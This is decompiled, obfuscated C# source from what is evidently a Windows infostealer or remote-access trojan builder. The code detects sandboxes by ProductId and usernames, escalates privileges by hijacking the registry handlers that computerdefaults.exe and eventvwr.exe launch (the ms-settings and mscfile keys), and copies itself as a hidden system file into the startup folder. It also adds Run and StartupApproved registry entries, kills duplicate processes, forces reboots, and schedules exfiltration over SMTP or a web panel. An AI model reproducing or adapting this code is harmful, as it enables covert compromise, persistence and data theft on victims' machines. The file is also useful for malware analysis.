using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Management;
using System.Net;
using System.Net.Mail;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Timers;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using My;

// Token: 0x02000010 RID: 16
[StandardModule]
internal sealed class afg
{
	// Token: 0x06000049 RID: 73 RVA: 0x000193E0 File Offset: 0x000175E0
	// Note: this type is marked as 'beforefieldinit'.
	static afg()
	{
		string[] array;
		for (;;)
		{
			IL_38C:
			uint num = 1345776620u;
			for (;;)
			{
				uint num2;
				switch ((num2 = (num ^ 1479175432u)) % 18u)
				{
				case 0u:
					afg.cgl = new afg.ux();
					num = (num2 * 1911646236u ^ 2897691268u);
					continue;
				case 2u:
					afg.ceu = false;
					afg.cev = false;
					afg.cey = false;
					afg.cex = false;
					afg.cew = "";
					afg.ceq = false;
					afg.cez = false;
					afg.cfg = cjp.cjr();
					afg.cfh = <Module>.smethod_strings_decryptor(333576 -> "yyyy-MM-dd HH:mm:ss"));
					afg.cfj = SystemInformation.UserName + "/" + SystemInformation.ComputerName;
					num = (num2 * 2879183207u ^ 2638584925u);
					continue;
				case 3u:
					afg.cfq = false;
					array = new string[1];
					num = (num2 * 85121257u ^ 932924635u);
					continue;
				case 4u:
					afg.cdw = false;
					afg.cdq = "5";
					num = (num2 * 2244393623u ^ 1441085347u);
					continue;
				case 5u:
					afg.cdz = "5";
					afg.cef = false;
					afg.ceg = <Module>.smethod_strings_decryptor(333424 -> "smtp"));
					afg.ceh = false;
					afg.cej = false;
					afg.cek = false;
					afg.cel = false;
					num = (num2 * 1990709161u ^ 2513657915u);
					continue;
				case 6u:
					afg.cgn = new afg.adm();
					afg.cfw = 0;
					num = (num2 * 432238990u ^ 1909461245u);
					continue;
				case 7u:
					afg.cfr = "";
					num = (num2 * 3821643255u ^ 1264612037u);
					continue;
				case 8u:
					afg.cer = false;
					num = (num2 * 1277461760u ^ 2927443429u);
					continue;
				case 9u:
					afg.cfn = RuntimeHelpers.GetObjectValue(afg.cfm.GetValue(<Module>.smethod_strings_decryptor(333184 -> "ProductId"))));
					afg.cfo = <Module>.smethod_strings_decryptor(333160 -> "76487-337-8429955-22614"));
					num = (num2 * 1020226265u ^ 17804356u);
					continue;
				case 10u:
					array[0] = "";
					num = (num2 * 4160019359u ^ 472833189u);
					continue;
				case 11u:
					afg.ces = false;
					afg.cet = Environment.GetEnvironmentVariable(<Module>.smethod_strings_decryptor(333400 -> "%startupfolder%"))) + <Module>.smethod_strings_decryptor(333472 -> "\%insfolder%\%insname%"));
					num = (num2 * 2654579533u ^ 2764584181u);
					continue;
				case 12u:
					afg.cgm = new afg.acm();
					num = (num2 * 682926381u ^ 3978498218u);
					continue;
				case 13u:
					afg.cfk = <Module>.smethod_strings_decryptor(333520 -> "Not resolved yet."));
					afg.FrameworkVersion = Environment.Version.Major;
					afg.cfl = new Random(checked((int)(DateTime.Now.Ticks % 2147483647L)));
					num = (num2 * 438537488u ^ 2481628587u);
					continue;
				case 14u:
					afg.cdx = false;
					num = (num2 * 2628790473u ^ 2607404720u);
					continue;
				case 15u:
					goto IL_38C;
				case 16u:
					afg.cem = false;
					afg.cen = false;
					afg.ceo = false;
					afg.cep = false;
					num = (num2 * 138433928u ^ 243190220u);
					continue;
				case 17u:
					afg.cfm = Registry.LocalMachine.OpenSubKey(<Module>.smethod_strings_decryptor(333624 -> "SOFTWARE\Microsoft\Windows NT\CurrentVersion")), false);
					num = (num2 * 1631138953u ^ 4129761440u);
					continue;
				}
				goto Block_1;
			}
		}
		Block_1:
		afg.cfz = array;
		afg.cgh = null;
		afg.cgj = null;
		afg.cgk = null;
	}

	// Token: 0x0600004A RID: 74
	[DllImport("user32.dll")]
	public static extern bool GetLastInputInfo(ref afg.ho afj);

	// Token: 0x0600004B RID: 75 RVA: 0x00019798 File Offset: 0x00017998
	private static void afk()
	{
		afg.afv(<Module>.smethod_strings_decryptor(333232 -> "Software\Classes")), <Module>.smethod_strings_decryptor(333208 -> "ms-settings\shell\open\command")), "");
		Thread.Sleep(100);
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(<Module>.smethod_strings_decryptor(333280 -> "Software\Classes\ms-settings\shell\open\command")), true);
			registryKey.SetValue(<Module>.smethod_strings_decryptor(333384 -> "DelegateExecute")), "");
			for (;;)
			{
				IL_8D:
				uint num = 826901317u;
				for (;;)
				{
					uint num2;
					switch ((num2 = (num ^ 988150638u)) % 3u)
					{
					case 1u:
						registryKey.Close();
						num = (num2 * 3400702557u ^ 2113978260u);
						continue;
					case 2u:
						goto IL_8D;
					}
					goto Block_4;
				}
			}
			Block_4:;
		}
		catch (Exception ex)
		{
			return;
		}
		afg.afv(<Module>.smethod_strings_decryptor(333328 -> "Software\Classes")), <Module>.smethod_strings_decryptor(332920 -> "ms-settings\shell\open\command")), Assembly.GetExecutingAssembly().Location);
		Process.Start(<Module>.smethod_strings_decryptor(332992 -> "C:\Windows\System32\computerdefaults.exe")));
		Thread.Sleep(1000);
		for (;;)
		{
			IL_133:
			uint num3 = 1925048345u;
			for (;;)
			{
				uint num2;
				switch ((num2 = (num3 ^ 988150638u)) % 3u)
				{
				case 0u:
					goto IL_133;
				case 1u:
					afg.agj(<Module>.smethod_strings_decryptor(332968 -> "Software\Classes\ms-settings\shell")), <Module>.smethod_strings_decryptor(333040 -> "open\command")));
					num3 = (num2 * 3805025543u ^ 3983143199u);
					continue;
				}
				return;
			}
		}
	}

	// Token: 0x0600004C RID: 76 RVA: 0x000198F0 File Offset: 0x00017AF0
	private static void afm()
	{
		afg.afv(<Module>.smethod_strings_decryptor(333016 -> "Software\Classes")), <Module>.smethod_strings_decryptor(333088 -> "mscfile\shell\open\command")), Assembly.GetExecutingAssembly().Location);
		for (;;)
		{
			IL_E1:
			uint num = 1337237928u;
			for (;;)
			{
				uint num2;
				switch ((num2 = (num ^ 538112263u)) % 6u)
				{
				case 0u:
				{
					ProcessStartInfo processStartInfo;
					Process.Start(processStartInfo);
					num = (num2 * 2276294035u ^ 2206384933u);
					continue;
				}
				case 1u:
				{
					ProcessStartInfo processStartInfo = new ProcessStartInfo(<Module>.smethod_strings_decryptor(332680 -> "C:\Windows\System32\eventvwr.exe")));
					num = (num2 * 249787195u ^ 3102311076u);
					continue;
				}
				case 2u:
					Thread.Sleep(1000);
					afg.agj(<Module>.smethod_strings_decryptor(332624 -> "Software\Classes\mscfile\shell")), <Module>.smethod_strings_decryptor(332728 -> "open\command")));
					num = (num2 * 4187850925u ^ 2277955188u);
					continue;
				case 4u:
				{
					ProcessStartInfo processStartInfo;
					processStartInfo.WindowStyle = ProcessWindowStyle.Normal;
					num = (num2 * 3954583061u ^ 4003379475u);
					continue;
				}
				case 5u:
					goto IL_E1;
				}
				return;
			}
		}
	}

	// Token: 0x0600004D RID: 77 RVA: 0x000199E8 File Offset: 0x00017BE8
	private static object afo()
	{
		object current = WindowsIdentity.GetCurrent();
		bool flag;
		for (;;)
		{
			IL_93:
			uint num = 1718344984u;
			for (;;)
			{
				uint num2;
				switch ((num2 = (num ^ 207974355u)) % 4u)
				{
				case 0u:
				{
					object instance;
					flag = Conversions.ToBoolean(NewLateBinding.LateGet(instance, null, <Module>.smethod_strings_decryptor(332800 -> "IsInRole")), new object[]
					{
						WindowsBuiltInRole.Administrator
					}, null, null, null));
					num = (num2 * 2486786442u ^ 626586086u);
					continue;
				}
				case 2u:
					goto IL_93;
				case 3u:
				{
					object instance = new WindowsPrincipal((WindowsIdentity)current);
					num = (num2 * 1827469160u ^ 3651917107u);
					continue;
				}
				}
				goto Block_1;
			}
		}
		Block_1:
		return flag;
	}

	// Token: 0x0600004E RID: 78 RVA: 0x00019A98 File Offset: 0x00017C98
	private static object afv(string afy, string afx, string afw)
	{
		object result;
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(afy, true);
			for (;;)
			{
				IL_69:
				uint num = 2860765858u;
				for (;;)
				{
					uint num2;
					switch ((num2 = (num ^ 3828579773u)) % 3u)
					{
					case 1u:
						registryKey.CreateSubKey(afx);
						registryKey.Close();
						registryKey = Registry.CurrentUser.OpenSubKey(afy + "\\" + afx, true);
						num = (num2 * 1545087743u ^ 1063503924u);
						continue;
					case 2u:
						goto IL_69;
					}
					goto Block_2;
				}
			}
			Block_2:
			registryKey.SetValue("", afw);
			result = true;
		}
		catch (Exception ex)
		{
			for (;;)
			{
				IL_D0:
				uint num3 = 3189804346u;
				for (;;)
				{
					uint num2;
					switch ((num2 = (num3 ^ 3828579773u)) % 3u)
					{
					case 1u:
						result = false;
						num3 = (num2 * 1129465919u ^ 3633107525u);
						continue;
					case 2u:
						goto IL_D0;
					}
					goto Block_4;
				}
			}
			Block_4:;
		}
		return result;
	}

	// Token: 0x0600004F RID: 79 RVA: 0x00019B90 File Offset: 0x00017D90
	private static object agj(string agk, string agl)
	{
		object result;
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(agk, true);
			registryKey.DeleteSubKey(agl);
			result = true;
		}
		catch (Exception ex)
		{
			result = false;
		}
		return result;
	}

	// Token: 0x06000050 RID: 80 RVA: 0x00019BE0 File Offset: 0x00017DE0
	public static bool agp(int agr, int ags)
	{
		checked
		{
			while (agr >= ags)
			{
				agr--;
				Thread.Sleep(1000);
			}
			return false;
		}
	}

	// Token: 0x06000051 RID: 81 RVA: 0x00019C04 File Offset: 0x00017E04
	[STAThread]
	public static void agu()
	{
		if (afg.agp(15, 1))
		{
			goto IL_16;
		}
		goto IL_91;
		uint num2;
		for (;;)
		{
			IL_49:
			uint num;
			switch ((num = (num2 ^ 2467928151u)) % 6u)
			{
			case 1u:
				goto IL_79;
			case 2u:
				Application.Exit();
				num2 = (num * 1059809706u ^ 947326260u);
				continue;
			case 3u:
				goto IL_91;
			case 4u:
				Application.Exit();
				num2 = (num * 3333571762u ^ 1292775220u);
				continue;
			case 5u:
				goto IL_16;
			}
			break;
		}
		string osfullName = hj.hk.Info.OSFullName;
		if (osfullName.Contains(<Module>.smethod_strings_decryptor(332776 -> "Windows 7"))) | osfullName.Contains(<Module>.smethod_strings_decryptor(332848 -> "Windows 8"))) | osfullName.Contains(<Module>.smethod_strings_decryptor(332824 -> "Windows 10"))))
		{
			try
			{
				string path = Path.GetTempPath() + <Module>.smethod_strings_decryptor(332384 -> "\temp.tmp"));
				for (;;)
				{
					IL_28F:
					uint num3 = 2336053801u;
					for (;;)
					{
						uint num;
						switch ((num = (num3 ^ 2467928151u)) % 14u)
						{
						case 1u:
						{
							int num4;
							File.WriteAllText(path, Conversions.ToString(checked(num4 + 1)));
							num3 = (num * 1575895408u ^ 2119150903u);
							continue;
						}
						case 2u:
							goto IL_199;
						case 4u:
							if (Operators.ConditionalCompareObjectEqual(afg.afo(), false, false))
							{
								num3 = (num * 3776208395u ^ 2709472986u);
								continue;
							}
							goto IL_12C;
						case 5u:
						{
							int num4 = Conversions.ToInteger(File.ReadAllText(path));
							num3 = (num * 4004353349u ^ 2808005331u);
							continue;
						}
						case 6u:
							if (osfullName.Contains(<Module>.smethod_strings_decryptor(332488 -> "Windows 10"))))
							{
								num3 = (num * 4076617778u ^ 112895944u);
								continue;
							}
							goto IL_13D;
						case 7u:
							if (File.Exists(path))
							{
								num3 = (num * 2314476505u ^ 3527395893u);
								continue;
							}
							goto IL_199;
						case 8u:
							num3 = (num * 1011284467u ^ 2569039295u);
							continue;
						case 9u:
							afg.afk();
							num3 = (num * 3132847285u ^ 1084555187u);
							continue;
						case 10u:
							goto IL_13D;
						case 11u:
							goto IL_12C;
						case 12u:
						{
							string value = File.ReadAllText(path);
							if (Conversions.ToInteger(value) <= 3)
							{
								num3 = 3578876983u;
								continue;
							}
							break;
						}
						case 13u:
							goto IL_28F;
						}
						goto Block_30;
						IL_12C:
						File.Delete(path);
						num3 = 3535267011u;
						continue;
						IL_13D:
						afg.afm();
						num3 = 3869382552u;
						continue;
						IL_199:
						File.WriteAllText(path, "1");
						num3 = 3761501775u;
					}
				}
				Block_30:;
			}
			catch (Exception ex)
			{
			}
			goto IL_2A8;
		}
		goto IL_2A8;
		IL_16:
		num2 = 3812193843u;
		goto IL_49;
		IL_79:
		afg.amu();
		if (afg.ceq)
		{
			num2 = 3703212879u;
			goto IL_49;
		}
		goto IL_2A8;
		IL_91:
		if (Operators.ConditionalCompareObjectEqual(afg.ajn(), true, false))
		{
			num2 = 3234670935u;
			goto IL_49;
		}
		goto IL_79;
		IL_2A8:
		if (Operators.CompareString(afg.ceg, <Module>.smethod_strings_decryptor(332432 -> "webpanel")), false) == 0)
		{
			goto IL_349;
		}
		goto IL_3B4;
		uint num5;
		for (;;)
		{
			IL_37C:
			uint num;
			switch ((num = (num5 ^ 2467928151u)) % 8u)
			{
			case 0u:
				afg.aqz();
				num5 = (num * 1562210430u ^ 3602142082u);
				continue;
			case 1u:
				afg.bcr();
				num5 = (num * 492387113u ^ 483011158u);
				continue;
			case 2u:
				goto IL_349;
			case 3u:
				if (!Directory.Exists(Environment.GetEnvironmentVariable(<Module>.smethod_strings_decryptor(332536 -> "%startupfolder%"))) + <Module>.smethod_strings_decryptor(332608 -> "\%insfolder%\"))))
				{
					num5 = (num * 917970793u ^ 1276930904u);
					continue;
				}
				goto IL_3EE;
			case 5u:
				goto IL_3B4;
			case 6u:
				if (Operators.CompareString(afg.cew, afg.cet, false) != 0)
				{
					num5 = (num * 1369894723u ^ 1627201306u);
					continue;
				}
				goto IL_718;
			case 7u:
				if (afg.ceu)
				{
					num5 = (num * 269088233u ^ 4073866667u);
					continue;
				}
				goto IL_718;
			}
			break;
		}
		Directory.CreateDirectory(Environment.GetEnvironmentVariable(<Module>.smethod_strings_decryptor(332584 -> "%startupfolder%"))) + <Module>.smethod_strings_decryptor(332144 -> "\%insfolder%\")));
		try
		{
			IL_3EE:
			if (File.Exists(afg.cet))
			{
				try
				{
					string fullPath = Path.GetFullPath(afg.cet);
					for (;;)
					{
						IL_4D8:
						uint num6 = 3872075973u;
						for (;;)
						{
							uint num;
							int num7;
							Process[] processes;
							Process process;
							switch ((num = (num6 ^ 2467928151u)) % 8u)
							{
							case 0u:
								goto IL_4D8;
							case 1u:
								if (num7 >= processes.Length)
								{
									num6 = 3926460096u;
									continue;
								}
								goto IL_40E;
							case 2u:
								processes = Process.GetProcesses();
								num6 = (num * 3600493202u ^ 658042872u);
								continue;
							case 3u:
								num7 = 0;
								num6 = (num * 985182661u ^ 666167017u);
								continue;
							case 4u:
								process.Kill();
								num6 = (num * 2201158543u ^ 1452165822u);
								continue;
							case 5u:
								goto IL_43C;
							case 6u:
								goto IL_40E;
							}
							goto Block_40;
							IL_40E:
							process = processes[num7];
							string fullPath2 = Path.GetFullPath(process.MainModule.FileName);
							if (Operators.CompareString(fullPath2, fullPath, false) == 0)
							{
								num6 = 2894482707u;
								continue;
							}
							IL_43C:
							checked
							{
								num7++;
								num6 = 3395348798u;
							}
						}
					}
					Block_40:;
				}
				catch (Exception ex2)
				{
				}
			}
			if (File.Exists(afg.cew))
			{
				if (File.Exists(afg.cet))
				{
					try
					{
						File.Delete(afg.cet);
					}
					catch (Exception ex3)
					{
					}
				}
				File.Copy(afg.cew, afg.cet, true);
				for (;;)
				{
					IL_590:
					uint num8 = 2954632696u;
					for (;;)
					{
						uint num;
						switch ((num = (num8 ^ 2467928151u)) % 4u)
						{
						case 0u:
							goto IL_590;
						case 1u:
							File.SetAttributes(afg.cet, FileAttributes.Hidden | FileAttributes.System);
							num8 = (num * 3560637783u ^ 364912150u);
							continue;
						case 3u:
							if (afg.cev)
							{
								num8 = (num * 475679654u ^ 3762946328u);
								continue;
							}
							break;
						}
						goto Block_36;
					}
				}
				Block_36:;
			}
		}
		catch (Exception ex4)
		{
		}
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(<Module>.smethod_strings_decryptor(332120 -> "Software\Microsoft\Windows\CurrentVersion\Run")), true);
			registryKey.SetValue(<Module>.smethod_strings_decryptor(332192 -> "%insregname%")), afg.cet);
			RegistryKey registryKey2 = Registry.CurrentUser.OpenSubKey(<Module>.smethod_strings_decryptor(332296 -> "SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run")), true);
			if (registryKey2 != null)
			{
				for (;;)
				{
					IL_703:
					uint num9 = 4153783840u;
					for (;;)
					{
						uint num;
						switch ((num = (num9 ^ 2467928151u)) % 8u)
						{
						case 0u:
						{
							byte[] array;
							array[8] = 0;
							array[9] = 0;
							array[10] = 0;
							array[11] = 0;
							byte[] value2 = array;
							registryKey2.SetValue(<Module>.smethod_strings_decryptor(332240 -> "%insregname%")), value2);
							registryKey2.Close();
							num9 = (num * 2168080443u ^ 3220618342u);
							continue;
						}
						case 2u:
						{
							byte[] array;
							array[7] = 0;
							num9 = (num * 1156649455u ^ 2250359169u);
							continue;
						}
						case 3u:
							goto IL_703;
						case 4u:
						{
							byte[] array;
							array[5] = 0;
							num9 = (num * 405274687u ^ 1337543165u);
							continue;
						}
						case 5u:
						{
							byte[] array;
							array[2] = 0;
							array[3] = 0;
							array[4] = 0;
							num9 = (num * 1813964395u ^ 3032781476u);
							continue;
						}
						case 6u:
						{
							byte[] array;
							array[6] = 0;
							num9 = (num * 3814942761u ^ 2774880339u);
							continue;
						}
						case 7u:
						{
							byte[] array = new byte[12];
							array[0] = 2;
							array[1] = 0;
							num9 = (num * 3001488578u ^ 1104351916u);
							continue;
						}
						}
						goto Block_46;
					}
				}
				Block_46:;
			}
		}
		catch (Exception ex5)
		{
		}
		IL_718:
		afg.bhz(afg.cet);
		if (afg.cex)
		{
			goto IL_8E8;
		}
		goto IL_B13;
		uint num10;
		Thread thread2;
		System.Timers.Timer timer4;
		for (;;)
		{
			IL_A77:
			uint num;
			switch ((num = (num10 ^ 2467928151u)) % 25u)
			{
			case 0u:
				afg.bjx();
				num10 = (num * 1355509546u ^ 3222333073u);
				continue;
			case 1u:
			{
				System.Timers.Timer timer;
				timer.Elapsed += afg.atv;
				timer.Interval = (double)(checked(60000 * Conversions.ToInteger(afg.cdq)));
				num10 = (num * 3418708736u ^ 1608398615u);
				continue;
			}
			case 2u:
				goto IL_923;
			case 4u:
			{
				System.Timers.Timer timer2 = new System.Timers.Timer();
				timer2.Elapsed += afg.bcl;
				timer2.Interval = 60000.0;
				timer2.Enabled = true;
				num10 = (num * 3909057186u ^ 1871081852u);
				continue;
			}
			case 5u:
				goto IL_B13;
			case 6u:
				goto IL_AFD;
			case 7u:
			{
				Thread thread;
				thread.IsBackground = true;
				num10 = (num * 2151575343u ^ 3030217102u);
				continue;
			}
			case 8u:
			{
				System.Timers.Timer timer;
				timer.Start();
				num10 = (num * 390427751u ^ 1979758633u);
				continue;
			}
			case 9u:
				afg.bcf();
				num10 = (num * 2816471672u ^ 1749814729u);
				continue;
			case 10u:
			{
				System.Timers.Timer timer;
				timer.Enabled = true;
				num10 = (num * 2688267002u ^ 2911856624u);
				continue;
			}
			case 11u:
				goto IL_945;
			case 12u:
				thread2.Start();
				if (afg.cdx == Conversions.ToBoolean(<Module>.smethod_strings_decryptor(331904 -> "True"))))
				{
					num10 = (num * 1518077214u ^ 1826785845u);
					continue;
				}
				goto IL_923;
			case 13u:
				goto IL_8E8;
			case 14u:
			{
				Thread thread = new Thread(new ThreadStart(afg.bky));
				num10 = (num * 369700672u ^ 585052410u);
				continue;
			}
			case 15u:
				Interaction.Shell(<Module>.smethod_strings_decryptor(332344 -> "Shutdown -r -t 5")), AppWinStyle.MinimizedFocus, false, -1);
				num10 = (num * 3602493606u ^ 896699502u);
				continue;
			case 16u:
				goto IL_75A;
			case 17u:
				goto IL_873;
			case 18u:
			{
				Thread thread;
				thread.Start();
				num10 = (num * 1940785721u ^ 3062331579u);
				continue;
			}
			case 19u:
			{
				System.Timers.Timer timer3 = new System.Timers.Timer();
				timer3.Elapsed += afg.aor;
				timer3.Interval = (double)(checked(60000 * Conversions.ToInteger(afg.cdz)));
				timer3.Enabled = true;
				num10 = (num * 2445306481u ^ 2705450431u);
				continue;
			}
			case 20u:
				thread2.IsBackground = true;
				num10 = (num * 3521234549u ^ 745569176u);
				continue;
			case 21u:
			{
				System.Timers.Timer timer = new System.Timers.Timer();
				num10 = (num * 785001048u ^ 2366461440u);
				continue;
			}
			case 22u:
				if (Operators.CompareString(afg.cew, afg.cet, false) != 0)
				{
					num10 = (num * 3042521482u ^ 613163366u);
					continue;
				}
				goto IL_B13;
			case 23u:
				timer4 = new System.Timers.Timer();
				timer4.Elapsed += afg.axw;
				num10 = (num * 1645219221u ^ 962731335u);
				continue;
			case 24u:
				goto IL_731;
			}
			break;
			IL_873:
			if (Operators.CompareString(afg.ceg, <Module>.smethod_strings_decryptor(331928 -> "webpanel")), false) == 0)
			{
				num10 = 2851436606u;
				continue;
			}
			goto IL_B34;
			IL_945:
			if (Operators.CompareString(afg.ceg, <Module>.smethod_strings_decryptor(331952 -> "webpanel")), false) == 0)
			{
				num10 = 2704462501u;
				continue;
			}
			goto IL_873;
			IL_923:
			if (Operators.CompareString(afg.ceg, <Module>.smethod_strings_decryptor(331880 -> "webpanel")), false) != 0)
			{
				goto IL_945;
			}
			num10 = 3004600394u;
		}
		timer4.Interval = 300000.0;
		timer4.Enabled = true;
		try
		{
			IL_B34:
			afg.bds();
		}
		catch (Exception ex6)
		{
		}
		new afg.np();
		Thread.Sleep(1000);
		System.Timers.Timer timer5 = new System.Timers.Timer();
		for (;;)
		{
			IL_C16:
			uint num11 = 3846587355u;
			for (;;)
			{
				uint num;
				switch ((num = (num11 ^ 2467928151u)) % 6u)
				{
				case 0u:
					goto IL_C16;
				case 1u:
					afg.cfu.aer();
					num11 = (num * 2996516122u ^ 3197100785u);
					continue;
				case 2u:
					timer5.Elapsed += afg.ayx;
					num11 = (num * 2052785705u ^ 2130047886u);
					continue;
				case 3u:
					timer5.Interval = 60000.0;
					timer5.Enabled = true;
					num11 = (num * 1012714361u ^ 3792324243u);
					continue;
				case 5u:
					if (afg.cdy)
					{
						num11 = (num * 569627484u ^ 32845042u);
						continue;
					}
					break;
				}
				goto Block_24;
			}
		}
		Block_24:
		Application.Run();
		return;
		IL_731:
		new Thread(new ThreadStart(afg.bjl))
		{
			IsBackground = true
		}.Start();
		if (afg.cdy)
		{
			num10 = 2385354342u;
			goto IL_A77;
		}
		IL_75A:
		thread2 = new Thread(new ThreadStart(afg.asz));
		num10 = 3153378601u;
		goto IL_A77;
		IL_8E8:
		num10 = 3045186769u;
		goto IL_A77;
		IL_AFD:
		if (afg.ceh)
		{
			num10 = 2198980600u;
			goto IL_A77;
		}
		goto IL_731;
		IL_B13:
		if (afg.cey)
		{
			num10 = 2216707150u;
			goto IL_A77;
		}
		goto IL_AFD;
		IL_349:
		num5 = 3911953638u;
		goto IL_37C;
		IL_3B4:
		afg.cew = Assembly.GetExecutingAssembly().Location;
		num5 = 3578303673u;
		goto IL_37C;
	}

	// Token: 0x06000052 RID: 82 RVA: 0x0001A8C8 File Offset: 0x00018AC8
	public static object ajn()
	{
		object result;
		try
		{
			string text = SystemInformation.UserName + "\\" + SystemInformation.ComputerName;
			string[] array = new string[6];
			array[0] = <Module>.smethod_strings_decryptor(332000 -> "Johnson"));
			array[1] = <Module>.smethod_strings_decryptor(332104 -> "Miller"));
			bool flag;
			for (;;)
			{
				IL_14F:
				uint num = 4279331327u;
				for (;;)
				{
					uint num2;
					switch ((num2 = (num ^ 2273892139u)) % 9u)
					{
					case 0u:
					{
						int num3;
						string[] array2;
						if (num3 >= array2.Length)
						{
							num = 3909828305u;
							continue;
						}
						goto IL_E1;
					}
					case 1u:
						goto IL_E1;
					case 2u:
						flag = true;
						num = (num2 * 1698854843u ^ 2902568958u);
						continue;
					case 3u:
						array[2] = <Module>.smethod_strings_decryptor(332048 -> "michael"));
						array[3] = <Module>.smethod_strings_decryptor(331640 -> "Abby"));
						array[4] = <Module>.smethod_strings_decryptor(331712 -> "Emily"));
						array[5] = <Module>.smethod_strings_decryptor(331688 -> "John"));
						num = (num2 * 3778876030u ^ 646978048u);
						continue;
					case 5u:
					{
						string[] array3 = array;
						num = (num2 * 1995582012u ^ 696966073u);
						continue;
					}
					case 6u:
					{
						flag = false;
						string[] array3;
						string[] array2 = array3;
						int num3 = 0;
						num = (num2 * 3964649458u ^ 665299062u);
						continue;
					}
					case 7u:
						goto IL_14F;
					case 8u:
						goto IL_3E;
					}
					goto Block_4;
					IL_3E:
					checked
					{
						int num3;
						num3++;
						num = 4193845786u;
						continue;
						IL_E1:
						string[] array2;
						string text2 = array2[num3];
						if (!text.ToLower().Contains(text2.ToLower()))
						{
							goto IL_3E;
						}
						num = 2213820934u;
					}
				}
			}
			Block_4:
			result = flag;
		}
		catch (Exception ex)
		{
			for (;;)
			{
				IL_1A5:
				uint num4 = 2517935958u;
				for (;;)
				{
					uint num2;
					switch ((num2 = (num4 ^ 2273892139u)) % 3u)
					{
					case 0u:
						goto IL_1A5;
					case 2u:
						result = false;
						num4 = (num2 * 760339821u ^ 3873163554u);
						continue;
					}
					goto Block_6;
				}
			}
			Block_6:;
		}
		return result;
	}

	// Token: 0x06000053 RID: 83 RVA: 0x0001AAA8 File Offset: 0x00018CA8
	public static object ajw(int ajq)
	{
		string text = Conversions.ToString(Strings.Chr(afg.cfl.Next(65, 91)));
		int num = 1;
		int num2 = checked(ajq - 1);
		int num3 = num;
		for (;;)
		{
			IL_141:
			uint num4 = 638439706u;
			for (;;)
			{
				uint num5;
				char value;
				switch ((num5 = (num4 ^ 753650258u)) % 11u)
				{
				case 0u:
					goto IL_141;
				case 1u:
					goto IL_D9;
				case 2u:
					if (num3 > num2)
					{
						num4 = 1718322368u;
						continue;
					}
					goto IL_D9;
				case 3u:
					goto IL_B2;
				case 4u:
					text += Conversions.ToString(value);
					checked
					{
						num3++;
						num4 = 1267948531u;
						continue;
					}
				case 5u:
					num4 = (num5 * 3930468545u ^ 27688331u);
					continue;
				case 6u:
					goto IL_6D;
				case 7u:
					num4 = (num5 * 3315229763u ^ 3315734571u);
					continue;
				case 8u:
					goto IL_3A;
				case 9u:
					num4 = (num5 * 1614294438u ^ 2751301473u);
					continue;
				}
				return text;
				IL_3A:
				value = Strings.Chr(afg.cfl.Next(97, 123));
				num4 = 326173276u;
				continue;
				IL_D9:
				switch (afg.cfl.Next(1, 4))
				{
				case 1:
					IL_6D:
					value = Strings.Chr(afg.cfl.Next(65, 91));
					num4 = 2023821061u;
					break;
				case 2:
					goto IL_3A;
				case 3:
					IL_B2:
					value = Strings.Chr(afg.cfl.Next(48, 58));
					num4 = 2023821061u;
					break;
				default:
					num4 = 610993556u;
					break;
				}
			}
		}
		return text;
	}

	// Token: 0x06000054 RID: 84
	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetVolumeInformationA([MarshalAs(UnmanagedType.VBByRefStr)] ref string aks, [MarshalAs(UnmanagedType.VBByRefStr)] ref string akt, int aku, ref int akv, ref int aky, ref int akx, [MarshalAs(UnmanagedType.VBByRefStr)] ref string akw, int akq);

	// Token: 0x06000055 RID: 85
	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetDiskFreeSpaceExA([MarshalAs(UnmanagedType.VBByRefStr)] ref string alm, ref long aln, ref long alo, ref long alp);

	// Token: 0x06000056 RID: 86 RVA: 0x0001AC00 File Offset: 0x00018E00
	public static string alr(afg.hp als)
	{
		string result;
		try
		{
			ComputerInfo computerInfo = new ComputerInfo();
			ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(<Module>.smethod_strings_decryptor(331760 -> "root\CIMV2")), <Module>.smethod_strings_decryptor(331736 -> "SELECT * FROM Win32_VideoController")));
			ManagementObjectSearcher managementObjectSearcher2 = new ManagementObjectSearcher(<Module>.smethod_strings_decryptor(331808 -> "SELECT * FROM Win32_Processor")));
			string text;
			for (;;)
			{
				IL_8D:
				uint num = 2948817828u;
				for (;;)
				{
					uint num2;
					switch ((num2 = (num ^ 3041782260u)) % 5u)
					{
					case 1u:
						if (als == afg.hp.OperatingSystemName)
						{
							num = (num2 * 1797348338u ^ 3085571380u);
							continue;
						}
						break;
					case 2u:
						goto IL_415;
					case 3u:
						text = computerInfo.OSFullName;
						num = (num2 * 1114572697u ^ 1087283402u);
						continue;
					case 4u:
						goto IL_8D;
					}
					goto Block_3;
				}
			}
			Block_3:
			if (als == afg.hp.ProcessorName)
			{
				string text2;
				try
				{
					ManagementObjectCollection.ManagementObjectEnumerator enumerator = managementObjectSearcher2.Get().GetEnumerator();
					for (;;)
					{
						IL_123:
						uint num3 = 3358655489u;
						for (;;)
						{
							uint num2;
							switch ((num2 = (num3 ^ 3041782260u)) % 5u)
							{
							case 0u:
								goto IL_BB;
							case 1u:
								num3 = (num2 * 144670160u ^ 3331401481u);
								continue;
							case 2u:
								goto IL_123;
							case 3u:
								if (!enumerator.MoveNext())
								{
									num3 = 2942125971u;
									continue;
								}
								goto IL_BB;
							}
							goto Block_12;
							IL_BB:
							ManagementObject managementObject = (ManagementObject)enumerator.Current;
							text2 = managementObject.GetPropertyValue(<Module>.smethod_strings_decryptor(331400 -> "Name"))).ToString();
							num3 = 2924338969u;
						}
					}
					Block_12:;
				}
				finally
				{
					ManagementObjectCollection.ManagementObjectEnumerator enumerator;
					if (enumerator != null)
					{
						for (;;)
						{
							IL_16D:
